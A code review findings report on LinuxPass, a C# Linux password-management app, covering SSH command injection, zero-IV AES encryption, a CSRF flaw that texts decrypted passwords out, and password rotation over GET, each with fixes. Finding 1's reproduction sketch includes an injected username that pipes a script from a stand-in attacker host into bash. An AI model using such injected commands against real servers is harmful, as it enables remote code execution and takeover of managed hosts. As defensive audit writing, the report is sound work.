# Code Review Findings — 2026-08-08 (pass 5)

## Finding 1 — Remote command injection via unescaped usernames and passwords in SSH commands

- **Severity:** high
- **Confidence:** high

### Where
- `LinuxPass/Services/AddUserService.cs:22`
- `LinuxPass/Services/ResetPassService.cs:35`
- `LinuxPass/Services/AddServerService.cs:22`

### What
The application builds shell commands by interpolating attacker-controlled or externally supplied values directly into command strings sent over SSH:

- `AddUserService` runs `sudo useradd -m {username} && echo '{username}:{password}' | sudo chpasswd`
- `ResetPassService` runs `echo '{user}:{password}' | sudo chpasswd`
- `AddServerService` runs commands containing `{username}` directly inside shell snippets and file paths

None of these values are shell-escaped.

### Why it matters
A user who can create or edit server/user records can inject shell metacharacters and execute arbitrary commands on the managed Linux hosts with the privileges of the SSH account, which is explicitly granted sudo rights by the same application flow.

This is especially severe because the `ServersController.Create` path uses `AddServerService.ResetPass(...)` to add passwordless sudo rules for the supplied SSH user, so successful command injection becomes host compromise rather than just application-level abuse.

### Reproduction sketch
Submit a username such as:

```text
bob; curl http://attacker/p.sh | bash #
```

or one containing single quotes to break out of the quoted `echo '{username}:{password}'` fragment. When the service executes the generated command over SSH, the injected shell syntax is evaluated by the remote shell.

### Recommendation
Do not construct shell commands through string interpolation. Either:

1. invoke a fixed remote script and pass arguments through a safe channel,
2. strictly validate usernames/hostnames against a conservative allowlist (for example Linux account names), and
3. shell-escape every dynamic argument before embedding it in a command.

Also avoid writing dynamic values into privileged file paths such as `/etc/sudoers.d/{username}` without validation.

---

## Finding 2 — Passwords are encrypted deterministically with a static zero IV

- **Severity:** high
- **Confidence:** high

### Where
- `LinuxPass/Services/CryptorService.cs:12-13`
- `LinuxPass/Services/CryptorService.cs:32-33`

### What
`CryptorService` derives the AES key by truncating/padding the configured string and then uses `aesAlg.IV = new byte[16]` for every encryption and decryption.

This means the scheme is deterministic: identical plaintext passwords encrypted under the same key always produce identical ciphertexts.

### Why it matters
A database leak exposes equality patterns between passwords across users and servers. Anyone with DB access can immediately tell which accounts share the same password or when a rotated password was reused. This weakens confidentiality even if the key itself is not yet known.

The same implementation also lacks an authentication tag/MAC, so ciphertext tampering is not detected cryptographically.

### Recommendation
Use an authenticated encryption scheme with a fresh random nonce/IV per record, for example AES-GCM. Store the nonce alongside the ciphertext and keep the encryption key in a proper secret store rather than manipulating it as a padded UTF-8 string.

---

## Finding 3 — SMS endpoint can be used as a CSRF trigger to exfiltrate passwords

- **Severity:** high
- **Confidence:** medium-high

### Where
- `LinuxPass/Controllers/PasswordsController.cs:157-182`
- `LinuxPass/Views/Passwords/Details.cshtml:71`

### What
`PasswordsController.SendSMS` is a state-changing POST endpoint, but it is missing `[ValidateAntiForgeryToken]`. The corresponding form in `Details.cshtml` also does not emit an antiforgery token.

When this endpoint receives a valid authenticated request, it decrypts the stored password server-side and sends it to the phone number supplied in the request.

### Why it matters
Because the whole site is protected by cookie-based authentication middleware, an attacker can trick an already signed-in user into submitting a cross-site form POST to `/Passwords/SendSMS`. The attacker chooses the `id` and `smsPhone` parameters, causing the application to text the secret to an attacker-controlled phone number without the victim intending to release it.

This turns a normal CSRF into credential exfiltration.

### Recommendation
Add `[ValidateAntiForgeryToken]` to `SendSMS` and include the antiforgery token in the form. Consider additional authorization checks or confirmation flows before transmitting decrypted credentials to any external channel.

---

## Finding 4 — Rotating server passwords is exposed as a GET request

- **Severity:** medium
- **Confidence:** high

### Where
- `LinuxPass/Controllers/ServersController.cs:183-204`
- `LinuxPass/Views/Servers/Index.cshtml:63-65`

### What
`ServersController.Rotate(int id)` performs a sensitive state-changing operation — it resets passwords on the target server and stores the new secrets — but it is exposed as a simple GET action and linked to by an `<a>` element.

### Why it matters
GET requests are routinely triggered by link prefetchers, crawlers, browser previews, email clients, chat applications, and malicious third-party pages. Because the operation changes remote credentials, exposing it via GET makes accidental or CSRF-style triggering much easier.

Even though global authentication is required, this does not mitigate unsolicited GET execution from a victim browser that already has an authenticated session.

### Recommendation
Change rotation to a POST-only action protected by antiforgery validation, and trigger it from a form/button instead of a hyperlink. For such a high-impact action, adding an explicit confirmation step or re-authentication would further reduce abuse.
